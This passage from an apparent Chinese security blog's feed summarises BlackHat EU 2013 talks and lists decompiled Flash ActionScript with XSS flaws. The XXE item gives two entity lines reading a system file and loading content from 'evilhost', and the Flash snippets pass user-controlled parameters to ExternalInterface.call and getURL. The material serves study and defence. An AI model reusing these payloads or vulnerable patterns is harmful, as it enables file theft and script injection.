      &lt;p&gt;文档下载：&lt;a href=&quot;http://cansecwest.com/csw13archive.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cansecwest.com/csw13archive.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="CanSecWest" scheme="http://riusksk.github.io/tags/CanSecWest/"/>
    
  </entry>
  
  <entry>
    <title>关于BlackHat EU 2013大会</title>
    <link href="http://riusksk.github.io/2013/03/20/BlackHat-EU-2013/"/>
    <id>http://riusksk.github.io/2013/03/20/BlackHat-EU-2013/</id>
    <published>2013-03-19T16:00:00.000Z</published>
    <updated>2016-06-24T14:24:54.000Z</updated>
    
    <content type="html">&lt;p&gt;大会文档下载：&lt;a href=&quot;https://www.blackhat.com/eu-13/archives.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.blackhat.com/eu-13/archives.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此次BH EU 议题整体较水，涉及系统安全、移动安全、网络传输安全、WEB安全、游戏安全等。下面随便挑几个议题简单介绍下，有些议题不是很感兴趣，有些也特水，有兴趣的自己到上面链接下载文档。&lt;/p&gt;
&lt;h3 id=&quot;1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》&quot;&gt;&lt;a href=&quot;#1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》&quot; class=&quot;headerlink&quot; title=&quot;1、《A PERFECT CRIME? ONLY TIME WILL TELL》&quot;&gt;&lt;/a&gt;1、《A PERFECT CRIME? ONLY TIME WILL TELL》&lt;/h3&gt;&lt;p&gt;讲述SSL攻击方法——CRIME，如何从SSL加密的会话中获取到cookie，CRIME原理就是通过在受害者的浏览器中运行JavaScript代码并同时监听HTTPS传输数据，进而解密会话Cookie，也算是中间人攻击MIMT的一种方法。该议题对&lt;code&gt;CRIME&lt;/code&gt;方法进行扩展，介绍一种叫&lt;code&gt;TIME (Timing Info-leak MadeEasy)&lt;/code&gt;的攻击手法，基于传输时间来猜测payload size，然后逐字猜解cookie。&lt;/p&gt;
&lt;h3 id=&quot;2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》&quot;&gt;&lt;a href=&quot;#2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》&quot; class=&quot;headerlink&quot; title=&quot;2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》&quot;&gt;&lt;/a&gt;2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》&lt;/h3&gt;&lt;p&gt;介绍常堆及内核溢出利用技巧，以及在win8上改进后的内存安全保护机制。里面构造堆内存布局的exploit技巧，与以往利用信息泄露获取dll基址来绕过ASLR方法有些类似，都通过分配特定大小的堆块，然后释放出与造成溢出的堆块大小相同的堆块，触发漏洞后覆盖到特定结构。同时，介绍了内核中的堆块分配与释放的原理，然后讲述不同大小的堆块溢出后，如何构造相应的堆布局来实现利用。最后，以windows object内核漏洞为例，讲述win7\win8上的exploit技巧，在wihte paper中已给出相应的exploit代码。&lt;/p&gt;
&lt;h3 id=&quot;3、《THE-DEPUTIES-ARE-STILL-CONFUSED》&quot;&gt;&lt;a href=&quot;#3、《THE-DEPUTIES-ARE-STILL-CONFUSED》&quot; class=&quot;headerlink&quot; title=&quot;3、《THE DEPUTIES ARE STILL CONFUSED》&quot;&gt;&lt;/a&gt;3、《THE DEPUTIES ARE STILL CONFUSED》&lt;/h3&gt;&lt;p&gt;总之，这议题很水，爱看不看。主要讲CSRF和点击劫持&lt;code&gt;clickjacking&lt;/code&gt;的攻击技巧，里面也提到前段时间facebook爆出的OAuth2认证漏洞，点击劫持就讲下beef的&lt;code&gt;clickjacking&lt;/code&gt;模块，然后提下防御点击劫持的&lt;code&gt;x-frame-options&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;4、《Hacking-Appliances-Ironic-exploits-in-security-products》&quot;&gt;&lt;a href=&quot;#4、《Hacking-Appliances-Ironic-exploits-in-security-products》&quot; class=&quot;headerlink&quot; title=&quot;4、《Hacking Appliances: Ironic exploits in security products》&quot;&gt;&lt;/a&gt;4、《Hacking Appliances: Ironic exploits in security products》&lt;/h3&gt;&lt;p&gt;初看这标题，还以为是讲客户端软件漏洞利用呢，其实主要还是讲WEB安全的多一些，觉得有点水。&lt;/p&gt;
&lt;h3 id=&quot;5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》&quot;&gt;&lt;a href=&quot;#5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》&quot; class=&quot;headerlink&quot; title=&quot;5、《HACKING VIDEO CONFERENCING SYSTEMS》&quot;&gt;&lt;/a&gt;5、《HACKING VIDEO CONFERENCING SYSTEMS》&lt;/h3&gt;&lt;p&gt;比较有趣的一个议题，主要讲述如何攻击语音会议系统，介绍了root提权以及远程调试的一些技巧，最后演示了一个后门shell。对这些不是很了解，有兴趣的自己看文档。&lt;/p&gt;
&lt;h3 id=&quot;6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》&quot;&gt;&lt;a href=&quot;#6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》&quot; class=&quot;headerlink&quot; title=&quot;6、《Hardening your Windows 8 apps for the Windows Store》&quot;&gt;&lt;/a&gt;6、《Hardening your Windows 8 apps for the Windows Store》&lt;/h3&gt;&lt;p&gt;很水，不解释&lt;/p&gt;
&lt;h3 id=&quot;7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》&quot;&gt;&lt;a href=&quot;#7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》&quot; class=&quot;headerlink&quot; title=&quot;7、《Harnessing GP²Us Building Better Browser Based Botnets》&quot;&gt;&lt;/a&gt;7、《Harnessing GP²Us Building Better Browser Based Botnets》&lt;/h3&gt;&lt;p&gt;觉得这议题有点在玩概念，实际攻击场景或者实战的东西很少，太理论化了。GPU现在很多被用在暴力破解方面，比如跑MD5、跑WPA-PSK，速度比CPU快得N多，比五速鞋还五速鞋……该议题主要讲构造基于浏览器的僵尸网络botnet，利用WEB漏洞（如XSS，并提到利用html5的WEB存储特性、插件等等方法实现永久XSS）来执行代码，再用GPU跑数据，然后利用C&amp;amp;C服务器进行通讯。&lt;/p&gt;
&lt;h3 id=&quot;8、《LET’S-PLAY-APPLANTING》&quot;&gt;&lt;a href=&quot;#8、《LET’S-PLAY-APPLANTING》&quot; class=&quot;headerlink&quot; title=&quot;8、《LET’S PLAY - APPLANTING》&quot;&gt;&lt;/a&gt;8、《LET’S PLAY - APPLANTING》&lt;/h3&gt;&lt;p&gt;很水，为什么这种也能上BH大会讲呢&lt;/p&gt;
&lt;h3 id=&quot;9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》&quot;&gt;&lt;a href=&quot;#9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》&quot; class=&quot;headerlink&quot; title=&quot;9、《MULTIPLAYER ONLINE GAMES INSECURITY》&quot;&gt;&lt;/a&gt;9、《MULTIPLAYER ONLINE GAMES INSECURITY》&lt;/h3&gt;&lt;p&gt;讲游戏漏洞相关的，主要涉及协议分析、常见客户端漏洞攻击等，没什么新鲜的东西，爱看不看。&lt;/p&gt;
&lt;h3 id=&quot;10、《Next-generation-mobile-rootkits》&quot;&gt;&lt;a href=&quot;#10、《Next-generation-mobile-rootkits》&quot; class=&quot;headerlink&quot; title=&quot;10、《Next generation mobile rootkits》&quot;&gt;&lt;/a&gt;10、《Next generation mobile rootkits》&lt;/h3&gt;&lt;p&gt;相对比较前沿的东西，主要讲arm平台上的rookit设计，但PPT写得太简洁了，简单一些文本描述，很难完全理解其中意思。之前viaForensics也写一篇关于android rootkit的文档《Dude,where’s my droid?!》，发表于RootedCON 2013安全大会，推荐阅读。&lt;/p&gt;
&lt;h3 id=&quot;11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》&quot;&gt;&lt;a href=&quot;#11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》&quot; class=&quot;headerlink&quot; title=&quot;11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》&quot;&gt;&lt;/a&gt;11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》&lt;/h3&gt;&lt;p&gt;可能一些搞硬件hacking或者移动安全的朋友会感兴趣，应该属于边信道攻击一类，玩这种都需要花钱买设备，所以搞这些的一般都是高富帅，像kevin2600一样。&lt;/p&gt;
&lt;h3 id=&quot;12、《XML-Out-Of-Band-Data-Retrieval》&quot;&gt;&lt;a href=&quot;#12、《XML-Out-Of-Band-Data-Retrieval》&quot; class=&quot;headerlink&quot; title=&quot;12、《XML Out-Of-Band Data Retrieval》&quot;&gt;&lt;/a&gt;12、《XML Out-Of-Band Data Retrieval》&lt;/h3&gt;&lt;p&gt;这种XML实体注入漏洞，在2011年的时候，80sec就有写过一篇文章提到《XML实体注入漏洞安全警告》&lt;a href=&quot;http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!ENTITY % payload SYSTEM &amp;quot;file:///c:/boot.ini&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://evilhost/evil.xml&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;漏洞实例见《zend framework文件读取漏洞分析》：&lt;a href=&quot;http://zone.wooyun.org/content/508&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zone.wooyun.org/content/508&lt;/a&gt; ，不过最早是在2002年的时候老外就有提出过这个问题。&lt;/p&gt;
&lt;h3 id=&quot;13、《Advanced-iOS-Application-Pentesting》&quot;&gt;&lt;a href=&quot;#13、《Advanced-iOS-Application-Pentesting》&quot; class=&quot;headerlink&quot; title=&quot;13、《Advanced iOS Application Pentesting》&quot;&gt;&lt;/a&gt;13、《Advanced iOS Application Pentesting》&lt;/h3&gt;&lt;p&gt;看标题冒似很“高级”的样子，实则就介绍下ios的一些逆向工具和ios编程中用到的一些类而已，还是爱看不看。&lt;/p&gt;
&lt;h3 id=&quot;14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》&quot;&gt;&lt;a href=&quot;#14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》&quot; class=&quot;headerlink&quot; title=&quot;14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》&quot;&gt;&lt;/a&gt;14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》&lt;/h3&gt;&lt;p&gt;主要讲WEB开发中安全编程，但主要就是在普及WEB安全漏洞的原理、防御等，包括XSS、注入、CSRF等等，算是总结性文章，没有新货，有兴趣的自个翻看下。&lt;/p&gt;
&lt;h3 id=&quot;15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》&quot;&gt;&lt;a href=&quot;#15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》&quot; class=&quot;headerlink&quot; title=&quot;15、《Assessing BYOD with the Smarthpone Pentest Framework》&quot;&gt;&lt;/a&gt;15、《Assessing BYOD with the Smarthpone Pentest Framework》&lt;/h3&gt;&lt;p&gt;作者公布了一款智能机渗透测试框架——Smartphone Pentest Framework v0.1.5，包括一些浏览器漏洞、客户端漏洞、社会工程学漏洞以及本地提权等，利用漏洞获取shell后还可发送短信、获取通信录、短信、下载上传文件等，有些功能还是不错的，但漏洞利用方法相对单一，有其利用的局限性。该工具下载地址：&lt;br&gt;&lt;a href=&quot;https://github.com/georgiaw/Smartphone-Pentest-Framework&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/georgiaw/Smartphone-Pentest-Framework&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;大会文档下载：&lt;a href=&quot;https://www.blackhat.com/eu-13/archives.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.blackhat.com/eu-13/archives.html
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="BlackHat" scheme="http://riusksk.github.io/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>若干flash xss漏洞分析</title>
    <link href="http://riusksk.github.io/2013/03/07/%E8%8B%A5%E5%B9%B2flash-xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://riusksk.github.io/2013/03/07/若干flash-xss漏洞分析/</id>
    <published>2013-03-06T16:00:00.000Z</published>
    <updated>2016-06-26T02:32:12.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;漏洞一&quot;&gt;&lt;a href=&quot;#漏洞一&quot; class=&quot;headerlink&quot; title=&quot;漏洞一&quot;&gt;&lt;/a&gt;漏洞一&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Parameters.getInstance().data = loaderInfo.parameters;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;onPlayStart&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:String&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (_data[&lt;span class=&quot;string&quot;&gt;&quot;onPlayStart&quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExternalInterface.call(Parameters.getInstance().onPlayStart, _arg1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExternalInterface.call(Parameters.getInstance().onPlayStop);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExternalInterface.call(Parameters.getInstance().onFileLoadedError);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞二&quot;&gt;&lt;a href=&quot;#漏洞二&quot; class=&quot;headerlink&quot; title=&quot;漏洞二&quot;&gt;&lt;/a&gt;漏洞二&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;reload&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(u, show_loading)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (show_loading == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        show_loading = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (show_loading) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        _root.loading = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Loading(&lt;span class=&quot;string&quot;&gt;&quot;Loading data...&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; _local2 = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (_root.data != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        _local2 = _root.data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (u != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (u.length &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            _local2 = u;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv = &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; LoadVars();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv.onLoad = LoadVarsOnLoad;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv.make_chart = make_chart;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv.make_pie = make_pie;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv.load(_local2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞三&quot;&gt;&lt;a href=&quot;#漏洞三&quot; class=&quot;headerlink&quot; title=&quot;漏洞三&quot;&gt;&lt;/a&gt;漏洞三&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; csPreloader;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;loader.loadClip(csPreloader, preloader_mc.target);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞四&quot;&gt;&lt;a href=&quot;#漏洞四&quot; class=&quot;headerlink&quot; title=&quot;漏洞四&quot;&gt;&lt;/a&gt;漏洞四&lt;/h3&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;this.loadXML(file);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function init(file, ploader, bookmark, contentpath)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;container.init(csConfigFile, preloader_mc, csFilesetBookmark, contentpath);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var csConfigFile;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞五&quot;&gt;&lt;a href=&quot;#漏洞五&quot; class=&quot;headerlink&quot; title=&quot;漏洞五&quot;&gt;&lt;/a&gt;漏洞五&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;    getURL(_loc2, &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.playList.currentClip().getLinkWindow());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; _loc2 = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.playList.currentClip().getLinkURL();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _loc1.getLinkURL = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.linkUrl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; _loc1 = (_global.org.flowplayer.playlist.Clip = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(name, baseUrl, fileName, start, end, protected, enableControl, linkUrl, linkWindow, type, allowResize, overlayFileName, overlayId, live, showOnLoadBegin, maxPlayCount, info, thumbnailUrl, suggestedClipsInfoUrl, id, keywords)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.linkUrl = linkUrl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ｝&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
